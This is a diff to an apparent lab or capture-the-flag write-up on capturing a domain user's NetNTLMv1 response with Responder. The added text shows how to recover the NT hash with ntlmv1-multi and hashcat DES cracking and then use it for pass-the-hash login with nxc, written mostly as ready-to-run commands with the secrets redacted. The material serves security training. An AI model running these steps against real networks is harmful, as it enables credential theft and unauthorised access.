@@ -219,19 +219,41 @@ NetNTLMv1 challenge-response captured</code></pre>
 
 <h2 id="netntlmv1-recovery">4. NetNTLMv1 Recovery</h2>
 
-<p>Responder was configured with a fixed challenge so the response could be processed by NTLMv1 recovery tooling:</p>
+<p>Responder was configured with a fixed eight-byte server challenge before Owen's workstation authenticated to the attacker host:</p>
+
+<pre data-lang="ini"><code>[Responder Core]
+Challenge = 1122334455667788</code></pre>
 
 <pre data-lang="bash"><code>sudo responder -I &lt;VPN_INTERFACE&gt; -v</code></pre>
 
-<p>The capture belonged to Owen F and used NTLMv1. The raw response, challenge and recovered credential material have been omitted.</p>
+<p>The challenge above is an illustrative value, not a claim about the redacted capture from this run. Use the challenge recorded in your own Responder log. The capture belonged to Owen F and used NetNTLMv1. Responder captured a challenge and response, <strong>not</strong> an NT hash that could be passed directly to SMB. Preserve the complete line, including the LM response and server challenge:</p>
 
-<p>The response was normalised and processed with NTLMv1 DES-key recovery tooling. GPU acceleration reduced the search time, but the important finding was not the cracking implementation. The security boundary had already failed when a domain workstation was allowed to send a recoverable NTLMv1 response to an untrusted destination.</p>
+<pre data-lang="text"><code>Owen.F::AIRWAYS:&lt;LM_RESPONSE&gt;:&lt;NT_RESPONSE&gt;:&lt;CHALLENGE&gt;</code></pre>
+
+<h3 id="recovering-the-nt-hash">4.1 Recovering the NT hash</h3>
+
+<p>The exact recovery command line from the assessment was not retained. The following is a reproducible equivalent using <a href="https://github.com/evilmog/ntlmv1-multi" target="_blank" rel="noopener">ntlmv1-multi</a> and Hashcat. The tool handles both ordinary NetNTLMv1 and NetNTLMv1 with extended session security (ESS); do not substitute an example challenge into a capture you already have.</p>
+
+<pre data-lang="bash"><code>git clone https://github.com/evilmog/ntlmv1-multi.git
+cd ntlmv1-multi
+uv run ntlmv1_nextgen.py --ntlmv1 'Owen.F::AIRWAYS:&lt;LM_RESPONSE&gt;:&lt;NT_RESPONSE&gt;:&lt;CHALLENGE&gt;' --hashcat</code></pre>
+
+<p>Copy the two <code>ciphertext:challenge</code> lines printed under “To crack with hashcat” into <code>14000.hash</code>, one per line. The tool calculates the effective challenge for ESS captures. Set <code>&lt;HASHCAT_DIR&gt;</code> to the directory containing Hashcat's <code>charsets/DES_full.hcchr</code> file. Hashcat mode 14000 then recovers the first two DES keys:</p>
+
+<pre data-lang="bash"><code>hashcat -m 14000 -a 3 -1 &lt;HASHCAT_DIR&gt;/charsets/DES_full.hcchr --hex-charset \
+  --potfile-path des.pot 14000.hash '?1?1?1?1?1?1?1?1'</code></pre>
+
+<p>After both lines are recovered, point the tool at the potfile. It converts the DES keys back to the first 14 bytes of the NT hash, derives the final two bytes from the third response block, and prints the complete 32-hex-character value as <code>NTLM</code>:</p>
+
+<pre data-lang="bash"><code>uv run ntlmv1_nextgen.py --ntlmv1 'Owen.F::AIRWAYS:&lt;LM_RESPONSE&gt;:&lt;NT_RESPONSE&gt;:&lt;CHALLENGE&gt;' --potfile des.pot</code></pre>
+
+<p>This recovers the NT hash without finding Owen's plaintext password. A wordlist attempt with <code>hashcat -m 5500</code> attacks the NetNTLMv1 capture for the password instead; it is a different route and may fail even when DES-key recovery succeeds. GPU acceleration reduced the DES search time in this assessment, but the time needed depends on the available hardware.</p>
 
 <p>After recovery, the NT hash was tested against WKSTN01 with pass-the-hash authentication:</p>
 
 <pre data-lang="bash"><code>nxc smb 192.168.100.3 -d AIRWAYS -u 'Owen.F' -H '&lt;NT_HASH&gt;'</code></pre>
 
-<p>The result showed local-administrator access.</p>
+<p>The result showed local-administrator access. The raw response, challenge, recovered hash and password remain redacted. The security boundary had already failed when a domain workstation sent a recoverable NetNTLMv1 response to an untrusted destination.</p>
 
 <h2 id="wkstn01-compromise-and-the-user-flag">5. WKSTN01 Compromise and the User Flag</h2>
 
